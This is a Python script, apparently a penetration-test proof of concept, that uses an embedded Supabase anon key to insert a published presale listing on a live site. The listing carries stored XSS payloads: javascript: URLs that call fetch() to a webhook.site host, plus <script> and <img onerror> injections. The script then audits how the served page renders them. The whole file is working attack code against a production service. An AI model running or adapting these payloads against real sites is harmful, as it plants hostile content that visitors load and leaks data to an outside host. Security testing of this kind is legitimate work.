#!/usr/bin/env python3
"""PROOF live-A — insert attacker row (anon key), audit served contexts, stage browser test."""
import json, re, uuid, sys, urllib.request, urllib.error

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
SUPA = "https://fapejsnjzijlnpjomjzk.supabase.co"
BASE = "https://www.moonsale.app"
KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZhcGVqc25qemlqbG5wam9tanprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYzMzEzMjksImV4cCI6MjA5MTkwNzMyOX0.X1WQp3MAHQJKJMCJtVqFyC4JUYc-4Hs5O7t66f5LWrg"
AHDR = {"apikey": KEY, "Authorization": f"Bearer {KEY}"}
UA = {"User-Agent": "Mozilla/5.0 Chrome/140.0"}
WEBHOOK = "https://webhook.site/735604c2-1bed-40df-86ee-bde11c60ec04"

def sreq(path, method="GET", body=None, headers=None, timeout=25):
    h = dict(AHDR)
    data = None
    if body is not None:
        data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    r = urllib.request.Request(f"{SUPA}/rest/v1/{path}", data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)

def wget(url, timeout=30):
    r = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

tag = f"pentest-poc-{uuid.uuid4().hex[:10]}"
print("tag:", tag)

MARK_ESC = "ESCAUDIT<angle>&amp;\"quote'</script>"
kyc_js = f"javascript:document.title='KYC-EXEC-'+document.domain;void fetch('{WEBHOOK}?lane=kyc')"
audit_js = f"javascript:document.title='AUDIT-EXEC-'+document.domain;void fetch('{WEBHOOK}?lane=audit')"

row = {
    "slug": tag,
    "project_name": "PT-ESCAUDIT-" + MARK_ESC[:12],
    "token_symbol": "POCX",
    "token_address": "0x" + "de" * 20,
    "token_decimals": 18, "chain_id": 56, "total_supply": 1000000,
    "presale_rate": 100, "listing_rate": 200, "raised_currency": "BNB",
    "raised_amount": 0, "softcap_amount": 1, "hardcap_amount": 2,
    "liquidity_percent": 51, "liquidity_lock_days": 30, "listing_dex": "PancakeSwap V2",
    "start_date": None, "end_date": None, "display_order": 9999,
    "short_description": "poc-short " + MARK_ESC,
    "long_description": "poc-long " + MARK_ESC + " <script>window.__poc_script_ran=1</script> <img src=x onerror=window.__poc_img_ran=1>",
    "is_kyc": True, "kyc_url": kyc_js,
    "is_audited": True, "audit_url": audit_js,
    "is_verified": False, "is_whitelist": False, "is_published": True,
    "participant_count": 0, "was_successful": False,
    "logo_url": "", "cover_url": "https://img.moonsale.app/downloads/powered-base.png",
    "website_url": "https://example.com", "whitepaper_url": "", "twitter_url": "", "telegram_url": "",
    "discord_url": "", "github_url": "", "medium_url": "",
}
st, body = sreq("m_presale", "POST", row, {"Prefer": "return=representation"})
print(f"[{st}] INSERT: {body[:200]}")
mine = None
if st in (200, 201):
    try: mine = json.loads(body)[0]["id"]
    except Exception: pass
print("row id:", mine)
with open("live_row.json", "w") as f:
    json.dump({"id": mine, "slug": tag, "kyc_js": kyc_js, "audit_js": audit_js}, f)

print("\n== served page audit ==")
st, page = wget(f"{BASE}/mpresale/{tag}")
print(f"detail page: [{st}] len={len(page)}")
if st == 200:
    open("evidence/xss_live_mpresale_page.html", "w", encoding="utf-8").write(page)
    checks = {
        "esc_u003c": page.count("\\u003c"),
        "esc_u003C": page.count("\\u003C"),
        "raw_lt_count": page.count("<"),
        "MARK_ESC raw": page.count(MARK_ESC),
        "KYC-EXEC raw": page.count("KYC-EXEC"),
        "javascript: raw": page.count("javascript:"),
        "raw </script> in flight?": len(re.findall(r"\\\\u003c/script", page)),
    }
    print(json.dumps(checks, indent=1))
    # find contexts of MARK_ESC and kyc payload
    for needle in [MARK_ESC[:18], "KYC-EXEC", "AUDIT-EXEC", "poc-long"]:
        idxs = [m.start() for m in re.finditer(re.escape(needle), page)]
        print(f"\n{needle!r}: {len(idxs)} occurrences")
        for i in idxs[:3]:
            print("  CTX:", repr(page[max(0,i-160):i+160]))
    # does javascript: appear in an href/onClick строке raw?
    i = page.find("javascript:")
    if i != -1:
        print("\njavascript: first ctx:", repr(page[max(0,i-260):i+260]))
